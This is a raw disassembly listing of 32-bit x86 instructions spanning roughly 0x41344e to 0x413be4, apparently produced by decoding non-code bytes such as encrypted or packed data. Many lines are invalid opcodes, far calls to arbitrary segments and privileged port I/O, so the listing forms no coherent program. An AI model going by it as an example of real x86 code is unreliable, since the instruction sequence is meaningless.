  41344e:	adc    eax,0x310c3627
  413453:	mov    bh,0x9f
  413455:	scas   eax,DWORD PTR es:[edi]
  413456:	or     eax,0xfdbe2717
  41345b:	mov    BYTE PTR [ebp+0x28feda64],bh
  413461:	or     esi,DWORD PTR [eax-0x10a96e37]
  413467:	mov    ch,0x4c
  413469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41346a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41346b:	push   edi
  41346c:	test   DWORD PTR [eax-0x66],edx
  41346f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413471:	fiadd  DWORD PTR [ecx+ebp*2-0x5ba37181]
  413478:	pop    ebx
  413479:	scas   al,BYTE PTR es:[edi]
  41347a:	cmp    al,0x84
  41347c:	add    DWORD PTR [eax-0x145ebd96],edx
  413482:	popf   
  413483:	adc    eax,0x2af60fce
  413488:	mov    DWORD PTR [edx],ecx
  41348a:	mov    bl,0xce
  41348c:	imul   edx,DWORD PTR [ecx],0xb45feea
  413492:	mov    bh,0x28
  413494:	in     al,dx
  413495:	sbb    ebp,DWORD PTR [eax+0x6b]
  413498:	push   ebx
  413499:	call   FWORD PTR [edx-0x7072caec]
  41349f:	sub    ebx,DWORD PTR [edx]
  4134a1:	or     BYTE PTR [edi-0x60],bh
  4134a4:	pushf  
  4134a5:	dec    esp
  4134a6:	mov    ebx,DWORD PTR [esi+ebx*1-0x45]
  4134aa:	push   ebp
  4134ab:	pop    eax
  4134ac:	cmp    dl,bh
  4134ae:	jnp    0x413487
  4134b0:	call   0x9d9d:0x1d1c87e0
  4134b7:	and    BYTE PTR [ecx-0x2],dh
  4134ba:	mov    dl,BYTE PTR [esi-0x5bdacc75]
  4134c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134c1:	push   edx
  4134c2:	fdivr  DWORD PTR [eax+0x2673f2fa]
  4134c8:	pusha  
  4134c9:	cmp    edi,ebx
  4134cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134cc:	mov    dl,0xbd
  4134ce:	and    edx,DWORD PTR [eax]
  4134d0:	ja     0x4134a8
  4134d2:	pop    edx
  4134d3:	sti    
  4134d4:	outs   dx,BYTE PTR ds:[esi]
  4134d5:	or     al,0xaf
  4134d7:	rcr    BYTE PTR [ebx+0x21e7c8d2],0x5e
  4134de:	call   FWORD PTR [edi-0x4d]
  4134e1:	jae    0x4134a6
  4134e3:	cld    
  4134e4:	mov    WORD PTR [esi+0x40],fs
  4134e7:	mov    esi,0xa71e4972
  4134ec:	cmp    al,0x3d
  4134ee:	jge    0x413564
  4134f0:	jno    0x41347d
  4134f2:	cmp    DWORD PTR [edx],esi
  4134f4:	mov    dl,0x78
  4134f6:	lahf   
  4134f7:	pop    ss
  4134f8:	(bad)  
  4134f9:	sbb    al,0x2
  4134fb:	loope  0x413540
  4134fd:	repz test al,0xa0
  413500:	repz sub ebx,DWORD PTR [ebp+edi*8-0x4764f52e]
  413508:	std    
  413509:	not    DWORD PTR [esp+esi*2+0x78f40eb6]
  413510:	push   edi
  413511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413512:	pop    ds
  413513:	es scas eax,DWORD PTR es:[edi]
  413515:	jbe    0x413531
  413517:	xchg   edx,eax
  413518:	test   DWORD PTR [eax],ecx
  41351a:	xor    ah,BYTE PTR [ebx]
  41351c:	pop    ebx
  41351d:	or     ecx,DWORD PTR [edi+0x3ec6d85b]
  413523:	add    DWORD PTR [ecx+0x53],ebx
  413526:	call   0xb99a:0x834b6cd1
  41352d:	pop    es
  41352e:	imul   DWORD PTR [ebp-0x749137fb]
  413534:	daa    
  413535:	or     al,0xd8
  413537:	cmp    dl,BYTE PTR [ebx-0x65]
  41353a:	and    ebp,ecx
  41353c:	adc    al,0xfd
  41353e:	cwde   
  41353f:	shl    ecx,0xd3
  413542:	inc    esp
  413543:	mov    dh,0x93
  413545:	dec    ebx
  413546:	repnz add al,0xd5
  413549:	or     ebp,DWORD PTR [edx+0x6]
  41354c:	pop    ecx
  41354d:	and    DWORD PTR [ecx+0x66],0xfffffff6
  413551:	stos   DWORD PTR es:[edi],eax
  413552:	mov    al,ds:0x608ad29c
  413557:	out    0x74,eax
  413559:	sbb    ecx,DWORD PTR [ebp-0x570b85e2]
  41355f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413560:	std    
  413561:	sub    ah,BYTE PTR [esi+0x4117d800]
  413567:	mov    BYTE PTR [edx+0x7dc260],dh
  41356d:	dec    edx
  41356e:	sub    ecx,0x44
  413571:	or     edi,ebx
  413573:	push   ebp
  413574:	mov    ds:0x5f6bc874,al
  413579:	sbb    BYTE PTR [edx-0x634b448],bl
  41357f:	push   eax
  413580:	add    DWORD PTR [ecx],0xfffffff3
  413583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413584:	out    dx,eax
  413585:	mov    BYTE PTR [edx+0x20],dh
  413588:	mov    cl,0x41
  41358a:	(bad)  
  41358b:	lea    esi,[edx+0x5cc28ce]
  413591:	xor    BYTE PTR [ebx-0x63f4a1e8],dh
  413597:	repz inc edi
  413599:	addr16 xor eax,0x9a0edab3
  41359f:	xchg   esi,eax
  4135a0:	ret    
  4135a1:	(bad)
  4135a5:	lods   al,BYTE PTR ds:[esi]
  4135a6:	dec    ebp
  4135a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135a8:	and    edi,DWORD PTR [ebp-0x71]
  4135ab:	in     al,0x1
  4135ad:	test   DWORD PTR [esi+0x35],0xfee05ab2
  4135b4:	dec    ebx
  4135b5:	mov    esi,0xb67f0d7
  4135ba:	test   eax,0xfbc233c2
  4135bf:	mov    BYTE PTR [edx-0x73],dl
  4135c2:	popf   
  4135c3:	dec    ecx
  4135c4:	not    BYTE PTR [esi-0x1e]
  4135c7:	icebp  
  4135c8:	xor    BYTE PTR [ebp+0xb968fe6],0xcd
  4135cf:	lds    esp,FWORD PTR [ebx-0x3c3dd6ba]
  4135d5:	add    eax,0xf111e29d
  4135da:	lea    ebx,[ebp+0x76c811b2]
  4135e0:	aas    
  4135e1:	or     esi,DWORD PTR [esi]
  4135e3:	clc    
  4135e4:	and    DWORD PTR [esi-0x20212c69],edx
  4135ea:	mov    esp,0x9ae3e56b
  4135ef:	pop    esp
  4135f0:	jo     0x413655
  4135f2:	add    eax,0xcc0fd484
  4135f7:	and    BYTE PTR [esp+eax*1-0x5c],cl
  4135fb:	addr16 loop 0x413646
  4135fe:	push   ebp
  4135ff:	outs   dx,BYTE PTR ds:[esi]
  413600:	xchg   esi,eax
  413601:	das    
  413602:	retf   
  413603:	je     0x4135b7
  413605:	aam    0x39
  413607:	cld    
  413608:	dec    edi
  413609:	call   0xf951:0xd6e0a0f6
  413610:	mov    ch,bl
  413612:	xor    bl,BYTE PTR [ebp+esi*1+0x629a9ade]
  413619:	xchg   esi,eax
  41361a:	or     esi,DWORD PTR gs:[esi-0x6e179246]
  413621:	out    0x64,eax
  413623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413624:	xchg   ebp,eax
  413625:	aad    0x4d
  413627:	sub    edi,DWORD PTR [eax+0x3e]
  41362a:	loope  0x4135e7
  41362c:	sub    al,0xb9
  41362e:	in     eax,dx
  41362f:	out    0x11,eax
  413631:	cli    
  413632:	push   0xffffffe8
  413634:	and    edx,ebx
  413636:	call   0xd55b:0x556e1652
  41363d:	adc    esi,DWORD PTR [edx-0x4f]
  413640:	sub    DWORD PTR [esi-0x5e8f5864],0x16b8a224
  41364a:	call   0x8bd3:0xae11837a
  413651:	mov    eax,0x9351a72c
  413656:	or     dl,BYTE PTR [eax+0x734380bb]
  41365c:	inc    edx
  41365d:	jmp    0x483b:0x814fce9a
  413664:	call   0xe31fed1c
  413669:	or     esp,ebp
  41366b:	pusha  
  41366c:	cli    
  41366d:	jmp    0x41365a
  41366f:	cmp    eax,0xe29deeda
  413674:	(bad)  
  413677:	aad    0x32
  413679:	sete   bl
  41367c:	xchg   esp,eax
  41367d:	or     esi,DWORD PTR [edx+0x21]
  413680:	push   edx
  413681:	jle    0x413651
  413683:	jb     0x41364b
  413685:	add    ah,BYTE PTR [edx+0x5c]
  413688:	mov    dl,0x44
  41368a:	pop    esi
  41368b:	xor    bl,BYTE PTR [edi+0x37]
  41368e:	stc    
  41368f:	cld    
  413690:	xchg   esp,eax
  413691:	or     esp,DWORD PTR [eax]
  413693:	push   edx
  413694:	lds    edx,FWORD PTR [ebx]
  413696:	dec    esp
  413697:	fdiv   DWORD PTR [edi+0x8]
  41369a:	call   0xc6dc:0x6cca6002
  4136a1:	ret    
  4136a2:	mov    ?,WORD PTR [ebx+0x52fd4c59]
  4136a8:	mov    dl,0x6b
  4136aa:	cmp    dl,BYTE PTR [edx]
  4136ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136ad:	mov    ecx,0x9c8b131a
  4136b2:	outs   dx,BYTE PTR ds:[esi]
  4136b3:	daa    
  4136b4:	sub    edx,0x3e13c498
  4136ba:	scas   al,BYTE PTR es:[edi]
  4136bb:	dec    ebp
  4136bc:	test   BYTE PTR [edi+0x27],bh
  4136bf:	mov    ds:0xf8e8ce,eax
  4136c4:	repnz mov eax,ds:0xc3e6869a
  4136ca:	in     al,0xc2
  4136cc:	mov    DWORD PTR [ebx],edx
  4136ce:	leave  
  4136cf:	test   eax,0x9b65556
  4136d4:	mov    dl,0x2d
  4136d6:	jo     0x41371f
  4136d8:	or     eax,0x5e98b5c2
  4136dd:	xor    ah,BYTE PTR [esi-0x4cf54d83]
  4136e3:	(bad)  
  4136e4:	in     eax,dx
  4136e5:	inc    ebp
  4136e6:	and    BYTE PTR [ebx-0x147e3050],ch
  4136ec:	es ss dec ecx
  4136ef:	push   eax
  4136f0:	rcr    BYTE PTR [ebp-0x204da2cd],cl
  4136f6:	fdiv   st(4),st
  4136f8:	ins    BYTE PTR es:[edi],dx
  4136f9:	jecxz  0x413692
  4136fb:	push   edx
  4136fc:	push   ebx
  4136fd:	adc    eax,0x4bb7a91f
  413702:	les    esi,FWORD PTR [ecx+0x60]
  413705:	and    esi,ebp
  413707:	jg     0x4136b9
  413709:	not    BYTE PTR [ebp+0x7acc5986]
  41370f:	inc    edi
  413710:	mov    dl,0xad
  413712:	or     ebx,DWORD PTR [ecx+0x70a28061]
  413718:	mov    dl,0x10
  41371a:	sub    DWORD PTR [ebp+0x53],esi
  41371d:	aad    0xf2
  41371f:	push   ebx
  413720:	dec    esi
  413721:	pop    eax
  413722:	call   0xc974:0x9feba2ee
  413729:	pop    edx
  41372a:	lock push edi
  41372c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41372d:	or     bh,BYTE PTR [eax+0x8]
  413730:	push   ecx
  413731:	rol    bl,1
  413733:	push   esi
  413734:	push   edi
  413735:	(bad)  
  413736:	xor    edx,edi
  413738:	mov    cl,0x67
  41373a:	cmp    eax,0x42a78972
  41373f:	pop    es
  413740:	jmp    0x5e8980a
  413745:	pop    ds
  413746:	add    ch,BYTE PTR [esi-0x13]
  413749:	neg    DWORD PTR [edx+0x16]
  41374c:	mov    dl,0xb7
  41374e:	jo     0x413745
  413750:	ds add al,0xa9
  413753:	inc    edi
  413754:	jecxz  0x413762
  413756:	dec    esi
  413757:	(bad)  
  413759:	mov    ah,0xfe
  41375b:	inc    edi
  41375c:	mov    esp,0x48d258af
  413761:	jge    0x4136fd
  413763:	das    
  413764:	sar    BYTE PTR [esi],cl
  413766:	cmp    DWORD PTR [ebp+0x31],ecx
  413769:	fistp  QWORD PTR ss:[ecx-0x5830ab1f]
  413770:	mov    cl,0x91
  413772:	ins    BYTE PTR es:[edi],dx
  413773:	aad    0x8b
  413775:	(bad)  
  413776:	ja     0x4136ff
  413778:	in     al,dx
  413779:	and    al,0x9a
  41377b:	or     DWORD PTR [edi-0x36],ecx
  41377e:	jmp    0x3e281389
  413783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413784:	scas   eax,DWORD PTR es:[edi]
  413785:	sub    BYTE PTR [ebx+0x4822c756],ah
  41378b:	dec    ecx
  41378c:	mov    dl,0xde
  41378e:	mov    ebp,0xc5a9f24b
  413793:	xchg   edi,eax
  413794:	mov    dh,0xb
  413796:	add    dh,BYTE PTR [edx]
  413798:	fidivr DWORD PTR [edx-0x5c5a8f8f]
  41379e:	call   0xde77:0x8a55773
  4137a5:	aas    
  4137a6:	pop    eax
  4137a7:	inc    ebx
  4137a8:	sbb    ecx,DWORD PTR [ebx]
  4137aa:	or     ch,ah
  4137ac:	imul   edx,DWORD PTR [ebx+0x5431fb68],0xd6d3929b
  4137b6:	or     eax,0x7177ec20
  4137bb:	pop    gs
  4137bd:	in     al,0x50
  4137bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c0:	aas    
  4137c1:	test   DWORD PTR [ecx+0x6aecd9d2],0xa401308a
  4137cb:	push   ss
  4137cc:	loopne 0x4137d8
  4137ce:	xchg   edi,eax
  4137cf:	or     eax,0xfe60bce9
  4137d4:	jp     0x41383a
  4137d6:	dec    ecx
  4137d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d8:	enter  0x6251,0x1f
  4137dc:	into   
  4137dd:	lahf   
  4137de:	addr16 inc ebx
  4137e0:	mov    dl,0xcc
  4137e2:	dec    eax
  4137e3:	pushf  
  4137e4:	mov    al,ds:0x2ad56f4c
  4137e9:	or     dh,dl
  4137eb:	(bad)  
  4137ec:	in     al,0x98
  4137ee:	(bad)  [esi+0x62]
  4137f1:	test   al,0x75
  4137f3:	add    BYTE PTR [edx+0x51c048f7],dh
  4137f9:	jp     0x4137bb
  4137fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137fc:	inc    ebx
  4137fd:	xor    ch,dh
  4137ff:	add    dh,BYTE PTR [edx]
  413801:	ficom  WORD PTR [edi+0xb]
  413804:	lods   eax,DWORD PTR ds:[esi]
  413805:	lods   eax,DWORD PTR ds:[esi]
  413806:	idiv   DWORD PTR [ebp+esi*4+0x49d7bcbb]
  41380d:	xchg   ecx,eax
  41380e:	sub    al,BYTE PTR [esi-0x584f88f9]
  413814:	dec    eax
  413815:	inc    edi
  413816:	adc    edx,DWORD PTR [edi-0x13abb1ae]
  41381c:	mov    cl,0xd6
  41381e:	test   DWORD PTR [ecx-0x56],ecx
  413821:	ins    DWORD PTR es:[edi],dx
  413822:	cli    
  413823:	pop    ds
  413824:	retf   0xbb32
  413827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413828:	xchg   edx,eax
  413829:	(bad)  
  41382a:	fstp   DWORD PTR ds:0x5962262b
  413830:	lds    edi,FWORD PTR [ebp-0x7c]
  413833:	adc    DWORD PTR [esi],ebx
  413835:	add    BYTE PTR [edx+0x1bbb1f0c],bl
  41383b:	adc    ebx,DWORD PTR [edx+ecx*1+0x21]
  41383f:	cli    
  413840:	loopne 0x4137f3
  413842:	jnp    0x413823
  413844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413845:	shl    DWORD PTR [ebp-0x6557a79a],cl
  41384b:	adc    eax,0x3a8a7c8e
  413850:	sub    eax,0x52d5f8b2
  413855:	or     edi,DWORD PTR [eax+0x1ddc274b]
  41385b:	aad    0x51
  41385d:	and    edi,ebp
  41385f:	in     eax,dx
  413860:	mov    dl,0x15
  413862:	fdivr  st(3),st
  413864:	stc    
  413865:	cmp    ebx,DWORD PTR [esi+0x23]
  413868:	dec    ebp
  413869:	or     esp,DWORD PTR [edx+eiz*4+0x54]
  41386d:	push   edx
  41386e:	test   eax,0x9ddabe16
  413873:	add    BYTE PTR [esi],cl
  413875:	xchg   edi,eax
  413876:	ins    BYTE PTR es:[edi],dx
  413877:	(bad)  
  413878:	sbb    DWORD PTR [ebx-0x22a784d1],ecx
  41387e:	pop    es
  41387f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413880:	sub    cl,dh
  413882:	call   0x6f98304b
  413887:	mov    eax,0x7651bdb2
  41388c:	mov    edx,0x5644d0b6
  413891:	or     al,0x3c
  413893:	add    BYTE PTR [eax+0x24],ah
  413896:	pop    esi
  413897:	inc    edi
  413898:	push   cs
  413899:	mov    esi,0x1aadb52c
  41389e:	out    dx,al
  41389f:	jmp    0x4a7a2a16
  4138a4:	sbb    al,0x93
  4138a6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4138a8:	push   ss
  4138a9:	push   ecx
  4138aa:	jecxz  0x4138ca
  4138ac:	jo     0x41385e
  4138ae:	sub    al,BYTE PTR [eax+0x303f68b2]
  4138b4:	mov    ah,0x38
  4138b6:	(bad)  
  4138b7:	out    dx,eax
  4138b8:	scas   eax,DWORD PTR es:[edi]
  4138b9:	or     edx,DWORD PTR [ecx-0x3b]
  4138bc:	fcom   QWORD PTR [esi-0x27]
  4138bf:	mov    ds:0xf9aa48f,eax
  4138c4:	xchg   ebp,eax
  4138c5:	adc    dh,bh
  4138c7:	fldl2e 
  4138c9:	inc    ebx
  4138ca:	js     0x413873
  4138cc:	mov    ch,0x61
  4138ce:	jnp    0x4138a0
  4138d0:	pop    edi
  4138d1:	cwde   
  4138d2:	xchg   esp,eax
  4138d3:	add    dh,BYTE PTR [edx+0x4e7d0383]
  4138d9:	sbb    al,0x1
  4138db:	cmp    esi,0x9
  4138de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138df:	push   es
  4138e0:	jmp    0x974c:0x521e10e2
  4138e7:	jns    0x41389b
  4138e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ea:	mov    ebp,0x27acd14a
  4138ef:	pop    ds
  4138f0:	sbb    cl,BYTE PTR [ebx]
  4138f2:	rcr    DWORD PTR [ecx+0x6cc8c588],cl
  4138f8:	repz cmp ah,ah
  4138fb:	mov    dh,BYTE PTR [ecx-0x1e7a1d61]
  413901:	push   edi
  413902:	(bad)  
  413903:	pop    ss
  413904:	push   esi
  413905:	fdivr  QWORD PTR fs:[ecx-0x1cbda578]
  41390c:	je     0x41392d
  41390e:	inc    eax
  41390f:	or     DWORD PTR [edx],esi
  413911:	and    al,0xe4
  413913:	test   BYTE PTR [ebx],cl
  413915:	adc    eax,0xcbcdc6b7
  41391a:	cmp    al,0x87
  41391c:	icebp  
  41391d:	inc    esi
  41391e:	mov    esi,0xc3378f5b
  413923:	daa    
  413924:	das    
  413925:	mov    DWORD PTR [esi-0x37b15fc2],ebp
  41392b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41392c:	clc    
  41392d:	ins    DWORD PTR es:[edi],dx
  41392e:	int    0x9a
  413930:	std    
  413931:	cmp    ah,al
  413933:	pop    ebx
  413934:	xchg   edi,eax
  413935:	jne    0x4138d1
  413937:	(bad)  [edx+0x2d]
  41393a:	cmp    esp,edx
  41393c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41393d:	mov    WORD PTR [eax+0x382b73a7],ss
  413943:	sbb    al,0x3d
  413945:	xchg   eax,edi
  413947:	push   eax
  413948:	mov    dl,0x65
  41394a:	jl     0x413907
  41394c:	or     BYTE PTR [edx+0x7b17a00f],al
  413952:	loopne 0x4138fb
  413954:	xor    BYTE PTR [esi+0x561e162],bh
  41395a:	lea    esp,[ebp-0x4e]
  41395d:	out    0x4a,al
  41395f:	sar    BYTE PTR [esi],cl
  413961:	stos   DWORD PTR es:[edi],eax
  413962:	lods   eax,DWORD PTR ds:[esi]
  413963:	xor    ecx,DWORD PTR [ebx-0xe50af5]
  413969:	cld    
  41396a:	cmp    DWORD PTR [ebx*4+0x5dba9dc7],edx
  413971:	mov    ch,0x71
  413973:	iret   
  413974:	ret    0x164d
  413977:	mov    dh,0x18
  413979:	and    eax,0xbf08fb3
  41397e:	mov    edx,0xbe91ffe7
  413983:	in     al,0xb2
  413985:	fcom   QWORD PTR [edi-0x735cacb7]
  41398b:	hlt    
  41398c:	or     al,0xb
  41398e:	into   
  41398f:	or     bl,cl
  413991:	aad    0x67
  413993:	adc    BYTE PTR [eax+0x62719abb],0x97
  41399a:	xor    BYTE PTR [ebx-0x581d2059],cl
  4139a0:	ret    
  4139a1:	and    al,0xb2
  4139a3:	aam    0xb3
  4139a5:	repnz sub al,0xb4
  4139a8:	mov    dl,0x8f
  4139aa:	into   
  4139ab:	aaa    
  4139ac:	push   ebx
  4139ad:	sbb    cl,dl
  4139af:	repnz shl DWORD PTR [edi-0x61],1
  4139b3:	fwait
  4139b4:	inc    ecx
  4139b5:	and    al,0x1a
  4139b7:	mov    esi,0x866b1e54
  4139bc:	pop    edx
  4139bd:	les    ebx,FWORD PTR [ebp+0x12370800]
  4139c3:	jecxz  0x413a37
  4139c5:	mov    ch,0x52
  4139c8:	test   DWORD PTR [ebx],0xb9d0bdac
  4139ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139cf:	ja     0x413a02
  4139d1:	pop    ds
  4139d2:	cdq    
  4139d3:	and    DWORD PTR [ecx],edi
  4139d5:	repz pop esp
  4139d7:	dec    edi
  4139d8:	inc    edx
  4139d9:	mov    bl,0xe2
  4139db:	xor    bl,dl
  4139dd:	or     ebx,DWORD PTR [eax]
  4139df:	mov    al,0x5f
  4139e1:	or     esp,esp
  4139e3:	add    ah,BYTE PTR [edx+0x34fc94d4]
  4139e9:	push   ss
  4139ea:	aad    0x7
  4139ec:	(bad)  
  4139ee:	outs   dx,DWORD PTR ds:[esi]
  4139ef:	jl     0x4139c5
  4139f1:	or     ebx,edi
  4139f3:	(bad)  
  4139f4:	fdiv   DWORD PTR [edx]
  4139f6:	data16 and BYTE PTR [edx+eax*4-0x66],bl
  4139fb:	scas   al,BYTE PTR es:[edi]
  4139fc:	rol    DWORD PTR [ecx+ebp*4-0x1b],0xe0
  413a01:	push   ebp
  413a02:	jne    0x4139ac
  413a04:	mov    dh,0xcb
  413a06:	push   esi
  413a07:	popf   
  413a08:	jb     0x413a50
  413a0a:	cmp    al,BYTE PTR [esi-0x386e83f2]
  413a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a11:	aad    0x10
  413a13:	repnz xor al,bl
  413a16:	stos   BYTE PTR es:[edi],al
  413a17:	in     al,0xe3
  413a19:	out    dx,al
  413a1a:	call   0xc8d2:0xb51cb816
  413a21:	sti    
  413a22:	ret    
  413a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a24:	xchg   ebx,eax
  413a25:	ret    0xcb66
  413a28:	cli    
  413a29:	shr    ch,0xfb
  413a2c:	mov    es,esi
  413a2e:	inc    ebp
  413a2f:	sbb    ah,BYTE PTR [ebp+0x23710c0b]
  413a35:	and    DWORD PTR [ecx-0x36f42bc1],edx
  413a3b:	xor    BYTE PTR [edi-0x4b252a45],cl
  413a41:	fistp  WORD PTR [edx+0x308f96c7]
  413a47:	cli    
  413a48:	mov    ebp,0xce4b80f2
  413a4d:	aaa    
  413a4e:	sahf   
  413a4f:	sbb    dh,BYTE PTR [ebp+0xabb2095]
  413a55:	sti    
  413a56:	ja     0x413aaf
  413a58:	and    BYTE PTR [esi-0x28d61a66],al
  413a5e:	xchg   edi,eax
  413a5f:	lahf   
  413a60:	jmp    0x413a58
  413a62:	pop    edi
  413a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a64:	aad    0xca
  413a66:	mov    ?,WORD PTR [edi-0x32]
  413a69:	adc    al,0x52
  413a6b:	pop    ds
  413a6c:	cwde   
  413a6d:	mov    ch,0x9a
  413a6f:	jne    0x413a37
  413a71:	(bad)  
  413a72:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413a74:	cli    
  413a75:	mov    al,0x8c
  413a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a78:	xor    eax,edi
  413a7a:	sub    al,0xaf
  413a7c:	inc    ebp
  413a7d:	lods   eax,DWORD PTR ds:[esi]
  413a7e:	test   al,0x40
  413a80:	mov    dl,0x84
  413a82:	mov    ds:0xb4a7c8d9,al
  413a87:	enter  0xb93,0x3a
  413a8b:	jo     0x413acd
  413a8d:	mov    cl,0x35
  413a8f:	inc    edx
  413a90:	clc    
  413a91:	jmp    0x413a2d
  413a93:	int    0xbf
  413a95:	jo     0x413a9a
  413a97:	jle    0x413a53
  413a99:	rcr    ecx,cl
  413a9b:	fstp   QWORD PTR [edx]
  413a9d:	or     ebx,DWORD PTR [esi]
  413a9f:	sahf   
  413aa0:	jle    0x413ab2
  413aa2:	pop    ebx
  413aa3:	mov    dh,0xfe
  413aa5:	lea    esi,[esp+edi*2-0x4e]
  413aa9:	pop    es
  413aaa:	fisttp DWORD PTR [eax+0x9598edc]
  413ab0:	adc    al,0x15
  413ab2:	aad    0xa0
  413ab4:	cdq    
  413ab5:	or     ecx,DWORD PTR [esp+ecx*2+0x31]
  413ab9:	imul   ecx,DWORD PTR [esi-0x61],0xf5dcd3b2
  413ac0:	xor    ch,bh
  413ac2:	pusha  
  413ac3:	in     eax,dx
  413ac4:	fist   WORD PTR ds:0x4b755a20
  413aca:	cdq    
  413acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413acc:	or     esp,DWORD PTR [edi+ebp*4]
  413acf:	test   al,0x5e
  413ad1:	adc    ch,dh
  413ad3:	sbb    BYTE PTR [ebx-0x6d6433e0],dh
  413ad9:	pop    edx
  413ada:	dec    dl
  413adc:	push   0xffffffed
  413ade:	das    
  413adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae0:	xor    edi,edx
  413ae2:	xor    bl,BYTE PTR [ebx]
  413ae4:	sub    eax,0xb2a89411
  413ae9:	repz or DWORD PTR [ebp+0x29],ecx
  413aed:	imul   ecx,DWORD PTR [eax-0x6b862bf],0xd21cb576
  413af7:	gs cs retf 
  413afa:	repz sahf 
  413afc:	test   al,0xe2
  413afe:	call   0xa0e6:0xbed65d38
  413b05:	sub    al,0x37
  413b07:	pop    ecx
  413b08:	xor    ecx,DWORD PTR [ebx]
  413b0a:	jmp    eax
  413b0c:	sbb    eax,0x51ce22e9
  413b11:	jnp    0x413aad
  413b13:	or     ecx,esp
  413b15:	push   esi
  413b16:	ds mov cl,0x3d
  413b19:	dec    edi
  413b1a:	cmp    esp,DWORD PTR [edi+0x6e103884]
  413b20:	rcr    DWORD PTR gs:[edx],cl
  413b23:	stos   DWORD PTR es:[edi],eax
  413b24:	mov    dl,0xc7
  413b26:	pop    edi
  413b27:	or     ebp,eax
  413b29:	xchg   BYTE PTR [edx+0x4b],ah
  413b2c:	or     ecx,DWORD PTR [bp+si+0x71bb]
  413b31:	lods   eax,DWORD PTR ds:[esi]
  413b32:	mov    al,ds:0x6a78d96a
  413b37:	inc    ebx
  413b38:	mov    dl,0x43
  413b3a:	out    dx,eax
  413b3b:	jno    0x413ae5
  413b3d:	cmp    cl,BYTE PTR [ecx]
  413b3f:	es mov esi,0xf23f8b0b
  413b45:	push   ecx
  413b46:	das    
  413b47:	in     eax,0x80
  413b49:	push   ds
  413b4a:	sahf   
  413b4b:	daa    
  413b4c:	mov    edi,0x3249deb8
  413b51:	scas   eax,DWORD PTR es:[edi]
  413b52:	rol    eax,0x31
  413b55:	or     eax,DWORD PTR [eax-0x5a48594a]
  413b5b:	adc    DWORD PTR [ebp-0x784d5ebe],eax
  413b61:	cwde   
  413b62:	js     0x413afa
  413b64:	mov    ebp,0x14c7cf17
  413b69:	in     eax,0x6c
  413b6b:	leave  
  413b6c:	div    BYTE PTR [edx]
  413b6e:	adc    eax,DWORD PTR ds:0x5b2a5cb2
  413b74:	mov    edx,ss
  413b76:	cmp    ebp,DWORD PTR [ecx]
  413b78:	mov    dl,0x51
  413b7a:	pop    ecx
  413b7b:	(bad)  
  413b7c:	ja     0x413b09
  413b7e:	test   al,0xab
  413b80:	push   ebx
  413b81:	or     edx,DWORD PTR [edi-0x72]
  413b84:	add    DWORD PTR [ebp+ecx*1-0x65403a42],esi
  413b8b:	jo     0x413b96
  413b8d:	add    al,0x84
  413b8f:	or     ebp,edx
  413b91:	xchg   ebp,eax
  413b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b93:	addr16 sbb al,0x99
  413b96:	mov    bh,0xb3
  413b98:	adc    eax,0xc11799ec
  413b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b9e:	xchg   edx,eax
  413b9f:	dec    esi
  413ba0:	out    dx,al
  413ba1:	stos   DWORD PTR es:[edi],eax
  413ba2:	ror    BYTE PTR [edx+eiz*8+0xb],cl
  413ba6:	repnz dec ebx
  413ba8:	sbb    dh,bh
  413baa:	jmp    0x2c41:0x9a102816
  413bb1:	daa    
  413bb2:	pop    edx
  413bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb4:	popf   
  413bb5:	dec    eax
  413bb6:	mov    ebp,0x3874caa7
  413bbb:	adc    al,0x8c
  413bbd:	add    bl,BYTE PTR [ecx]
  413bbf:	retf   
  413bc0:	mov    dl,0x1f
  413bc2:	cmp    dl,al
  413bc4:	fld    DWORD PTR [edx+0xb99fefc]
  413bca:	push   ebp
  413bcb:	inc    eax
  413bcc:	add    edx,esi
  413bce:	sub    al,0x83
  413bd0:	fstp   QWORD PTR [esi+ebx*4]
  413bd3:	sub    eax,0x6caa728c
  413bd8:	xor    ebx,edi
  413bda:	pop    ecx
  413bdb:	dec    edi
  413bdc:	jle    0x413ba9
  413bde:	dec    eax
  413bdf:	(bad)  
  413be0:	outs   dx,BYTE PTR ds:[esi]
  413be1:	daa    
  413be2:	push   ebp
  413be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be4:	cld    
